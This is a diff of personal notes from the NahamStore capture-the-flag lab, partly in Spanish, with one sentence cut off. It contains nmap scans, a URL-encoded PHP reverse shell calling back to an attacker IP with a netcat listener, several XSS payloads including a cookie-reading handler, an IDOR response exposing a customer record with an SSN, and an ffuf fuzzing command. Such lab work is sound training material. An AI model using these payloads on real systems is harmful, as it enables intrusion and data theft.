@@ -1,8 +1,8 @@
 ──(kali㉿kali)-[~/Downloads/NahamStore]
-└─$ sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 10.201.98.118 -oN scan.txt
+└─$ sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 10.201.114.3 -oN scan.txt
 [sudo] password for kali: 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-01 09:51 EDT
-Nmap scan report for 10.201.98.118
+Nmap scan report for 10.201.114.3
 Host is up (0.27s latency).
 Not shown: 65532 closed tcp ports (reset)
 PORT     STATE SERVICE
@@ -17,12 +17,12 @@ Nmap done: 1 IP address (1 host up) scanned in 14.92 seconds
 22,80,8000
                                                                                                                         
 ┌──(kali㉿kali)-[~/Downloads/NahamStore]
-└─$ nmap -22,80,8000 -sV -sC -Pn -vvv -n 10.201.98.118 -oN fullScan.txt 
+└─$ nmap -22,80,8000 -sV -sC -Pn -vvv -n 10.201.114.3 -oN fullScan.txt 
 nmap: unrecognized option '-22,80,8000'
 See the output of nmap -h for a summary of options.
                                                                                                                         
 ┌──(kali㉿kali)-[~/Downloads/NahamStore]
-└─$ nmap -p22,80,8000 -sV -sC -Pn -vvv -n 10.201.98.118 -oN fullScan.txt 
+└─$ nmap -p22,80,8000 -sV -sC -Pn -vvv -n 10.201.114.3 -oN fullScan.txt 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-01 09:52 EDT
 NSE: Loaded 156 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -36,15 +36,15 @@ NSE: Starting runlevel 3 (of 3) scan.
 Initiating NSE at 09:52
 Completed NSE at 09:52, 0.00s elapsed
 Initiating Connect Scan at 09:52
-Scanning 10.201.98.118 [3 ports]
-Discovered open port 22/tcp on 10.201.98.118
-Discovered open port 80/tcp on 10.201.98.118
-Discovered open port 8000/tcp on 10.201.98.118
+Scanning 10.201.114.3 [3 ports]
+Discovered open port 22/tcp on 10.201.114.3
+Discovered open port 80/tcp on 10.201.114.3
+Discovered open port 8000/tcp on 10.201.114.3
 Completed Connect Scan at 09:52, 0.26s elapsed (3 total ports)
 Initiating Service scan at 09:52
-Scanning 3 services on 10.201.98.118
+Scanning 3 services on 10.201.114.3
 Completed Service scan at 09:52, 11.99s elapsed (3 services on 1 host)
-NSE: Script scanning 10.201.98.118.
+NSE: Script scanning 10.201.114.3.
 NSE: Starting runlevel 1 (of 3) scan.
 Initiating NSE at 09:52
 Completed NSE at 09:52, 7.58s elapsed
@@ -54,7 +54,7 @@ Completed NSE at 09:52, 1.05s elapsed
 NSE: Starting runlevel 3 (of 3) scan.
 Initiating NSE at 09:52
 Completed NSE at 09:52, 0.00s elapsed
-Nmap scan report for 10.201.98.118
+Nmap scan report for 10.201.114.3
 Host is up, received user-set (0.26s latency).
 Scanned at 2025-08-01 09:52:11 EDT for 21s
 
@@ -126,13 +126,20 @@ shop.nahamstore.thm marketing.nahamstore.thm stock.nahamstore.thm nahamstore-202
 
 
 
+
+
+
+
  `php%20-r%20%27%24sock%3Dfsockopen%28%2210.8.163.249%22%2C4444%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27`
 
 
 
 
+─$ nc -nlvp 4444  
 
- connect to [10.8.163.249] from (UNKNOWN) [10.201.98.118] 38374
+
+
+ connect to [10.8.163.249] from (UNKNOWN) [10.201.114.3] 38374
 ls
 css
 index.php
@@ -183,3 +190,163 @@ http://nahamstore-2020-dev.nahamstore.thm/api/customers/?customer_id=2
 
 
 {"id":2,"name":"Jimmy Jones","email":"jd.jones1997@yahoo.com","tel":"501-392-5473","ssn":"521-61-6392"}
+
+{
+"id": 2,
+"name": "Jimmy Jones",
+"email": "jd.jones1997@yahoo.com",
+"tel": "501-392-5473",
+"ssn": "521-61-6392"
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Intente activar el error, cambie el cifrado, por ejemplo. http://marketing.nahamstore.thm/8d1952ba2b3c6dcd76236f090ab8642c to http://marketing.nahamstore.thm/8d1952ba2b3c6dcd76236f090ab8642a
+
+
+
+
+Inserte la carga útil xss: <script>alert(‘XSS’)</script> y se mostrará correctamente una ventana emergente de JavaScript
+
+<script>alert('XSS');</script>
+
+1. http://marketing.nahamstore.thm/?error=      <script>alert('XSS');</script>
+
+
+
+## 2 xss   User-Agent
+
+
+POST /basket HTTP/1.1
+Host: nahamstore.thm
+Content-Length: 37
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://nahamstore.thm
+Content-Type: application/x-www-form-urlencoded
+User-Agent: <script>alert('XSS');</script>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://nahamstore.thm/basket
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: token=bb72697aca9485e60239d4733654c502; session=cb4e5b3a6057628857e96e0a65af6a2a
+Connection: close
+address_id=6&card_no=1234123412341234
+
+
+
+## 3   title
+
+http://nahamstore.thm/product?id=1&name=%3C/title%3E%3Cscript%3Ealert(%27XSS%27)%3C/script%3E%3C/title%3E
+
+
+
+
+
+## 4   search
+
+
+<script>
+    var search = '&lt;script&gt;alert('XSS');&lt;/script&gt;';
+    $.get('/search-products?q=' + search,function(resp){
+        if( resp.length == 0 ){
+
+            $('.product-list').html('<div class="text-center" style="margin:10px">No matching products found</div>');
+
+        }else {
+            $.each(resp, function (a, b) {
+                $('.product-list').append('<div class="col-md-4">' +
+                    '<div class="product_holder" style="border:1px solid #ececec;padding: 15px;margin-bottom:15px">' +
+                    '<div class="image text-center"><a href="/product?id=' + b.id + '"><img class="img-thumbnail" src="/product/picture/?file=' + b.img + '.jpg"></a></div>' +
+                    '<div class="text-center" style="font-size:20px"><strong><a href="/product?id=' + b.id + '">' + b.name + '</a></strong></div>' +
+                    '<div class="text-center"><strong>$' + b.cost + '</strong></div>' +
+                    '<div class="text-center" style="margin-top:10px"><a href="/product?id=' + b.id + '" class="btn btn-success">View</a></div>' +
+                    '</div>' +
+                    '</div>');
+            });
+        }
+    });
+</script>
+
+
+
+
+"';alert('XSS');'"
+
+<script>
+var search = '"';alert('XSS');'"';
+
+</script>
+
+
+
+
+
+## 5
+
+http://nahamstore.thm/returns/2?auth=c81e728d9d4c2f636f067f89cc14862c
+
+
+</textarea><script>alert('XSS');</script>
+
+
+
+## 6
+
+
+http://nahamstore.thm/%3Cscript%3Ealert('XSS');%3C/script%3E
+
+
+
+
+
+
+
+## 7 
+
+: http://nahamstore.thm/product?id=1&added=1&discount=99999" "onmouseover=alert(documento.cookie)
+
+¿Qué otro parámetro oculto puedes encontrar en la tienda cual pu
+
+
+
+
+
+http://nahamstore.thm/product?id=2
+
+<script>
+$('.checkstock').click( function(){
+
+$.post('/stockcheck',{
+product_id  :   $(this).attr('data-product-id'),
+server      :   'stock.nahamstore.thm'
+},function(resp){
+let obj = JSON.parse(resp);
+alert( 'There are ' + obj.stock + ' items in stock');
+});
+});
+</script>
+
+
+
+
+
+
+# XXE
+
+
+ffuf -u "http://nahamstore.thm/?FUZZ=https://google.com" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -ac (r & q)
